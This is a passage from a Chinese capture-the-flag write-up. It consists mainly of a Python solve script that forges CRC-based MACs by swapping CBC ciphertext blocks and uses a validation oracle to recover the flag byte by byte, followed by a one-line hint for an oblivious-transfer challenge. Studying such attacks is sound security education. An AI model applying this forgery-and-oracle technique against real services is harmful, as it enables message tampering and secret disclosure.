with open('predata.dat', 'rb') as f:
    flip = pickle.load(f)

# for _ in range(100):
#     b = os.urandom(p_len)
#     o = random.randint(0, p_len - 1)
#     i = random.randint(0, 7)
#     x = b[:o] + ((1<<i) ^ b[o]).to_bytes(1, 'big') + b[o+1:]
#     h = hmac_crc128(MAC_key, x)
#     assert h == xor(hmac_crc128(MAC_key, b), flip[o * 8 + i]) 
# print('Test Pass!')

def swap_block(p, c, n):
    global pre_block, flip
    p = bytes.fromhex(p)
    pn = n * 3
    n = pre_block + n * 3
    _p = xor(p[pn*16: (pn+3)*16], c[16+(n-1)*16: 16+(n+2)*16])
    _p = xor(_p[16: 32], c[16+(n-1)*16: 16+n*16]) + xor(_p[0: 16], c[16+(n+1)*16: 16+(n+2)*16]) + xor(_p[32: 48], c[16+n*16: 16+(n+1)*16])
    _p = xor(_p, p[pn*16: (pn+3)*16])
    delta = b'\x00' * 16
    for o in range(3 * 16):
        for i in range(8):
            if _p[o] & (1<<i) != 0:
                delta = xor(delta, flip[(n*16+o) * 8 + i])
    return delta, c[:16+n*16] + c[16+(n+1)*16: 16+(n+2)*16] + c[16+n*16: 16+(n+1)*16] + c[16+(n+2)*16:]


def AES_decrypt(ciphertext):
    iv = ciphertext[: AES.block_size]
    aes = AES.new(AES_key, AES.MODE_CBC, iv)
    plaintext = aes.decrypt(ciphertext[AES.block_size :])
    plaintext = unpad(plaintext)
    return plaintext


fg = b'}\n'
print(fg)
for o in range(len(fg), fg_len):
    while True:
        try:
            name_len = 1
            while (28 + name_len + fg_len) % 16 != (o + 1) % 16:
                name_len += 1
            extra_len = p_len - 28 - name_len - fg_len
            pre_block = (28 + name_len + fg_len - o - 1) // 16

            p = '00' + fg.hex() + '00' * extra_len
            c = bytes.fromhex(talk_to_Alice('00' * name_len, '00' * extra_len))
            d_s = [''] * block
            d_c = [0] * block
            for i in range(block):
                d_s[i], _ = swap_block(p, c, i+1)
                d_c[i] = 1 << i
            delta_s = [''] * 128
            delta_c = [0] * 128
            for _o in range(16):
                for i in range(8):
                    now = 0
                    while now < block:
                        if d_c[now] != -1 and d_s[now][_o] & (1<<i) != 0:
                            break
                        now += 1
                    assert now < block
                    delta_s[_o*8+i] = d_s[now]
                    delta_c[_o*8+i] = d_c[now]
                    j = now + 1
                    while j < block:
                        if d_c[j] != -1 and d_s[j][_o] & (1<<i) != 0:
                            d_s[j] = xor(d_s[j], d_s[now])
                            d_c[j] ^= d_c[now]
                        j += 1
                    d_c[now] = -1

                    # Test

                    # _c = c
                    # _d = b'\x00' * 16
                    # for _i in range(block):
                    #     if delta_c[_o*8+i] & (1 << _i) != 0:
                    #         _, _c = swap_block(p, _c, _i+1)
                    #         _d = xor(_d, _)
                    # assert delta_s[_o*8+i] == _d
            
            def cal(delta):
                ret = 0
                for _o in range(16):
                    for i in range(8):
                        if delta[_o] & (1 << i) != 0:
                            delta = xor(delta, delta_s[_o*8+i])
                            ret ^= delta_c[_o*8+i]
                assert delta == b'\x00' * 16
                return ret

            def cal_test(delta):
                _c = c
                delta, _c = swap_block(p, _c, 0)
                _delta = delta
                ret = 0
                for _o in range(16):
                    for i in range(8):
                        if delta[_o] & (1 << i) != 0:
                            delta = xor(delta, delta_s[_o*8+i])
                            ret ^= delta_c[_o*8+i]
                assert delta == b'\x00' * 16
                for i in range(block):
                    if ret & (1 << i) != 0:
                        _, _c = swap_block(p, _c, i+1)
                        delta = xor(delta, _)
                        ret -= (1 << i)
                assert _delta == delta
            
            # Test
            
            # for i in range(128):
            #     cal_test(delta_s[i])
            #     print(i)
            
            ck = False
            for ch in printable:
                p = ('%02x' % ch) + fg.hex() + '00' * extra_len
                _c = c
                delta, _c = swap_block(p, _c, 0)
                ret = cal(delta)
                for i in range(block):
                    if ret & (1 << i) != 0:
                        n = pre_block + (i+1) * 3
                        _c = _c[:16+n*16] + _c[16+(n+1)*16: 16+(n+2)*16] + _c[16+n*16: 16+(n+1)*16] + _c[16+(n+2)*16:]
                if talk_to_Bob(_c.hex()):
                    ck = True
                    fg = bytes([ch]) + fg
                    break

            print(fg)
            assert ck == True
            break
        except EOFError:
            conn = connect_remote()
            continue
        except Exception as e:
            raise e
```

最后吐槽一句，为啥 FLAG 最后一个字符是回车 `\n`……

## 不经意传输

第一问 $v=x0$ 就可以了，吐出来的 `m0_` 就是 `m0`。
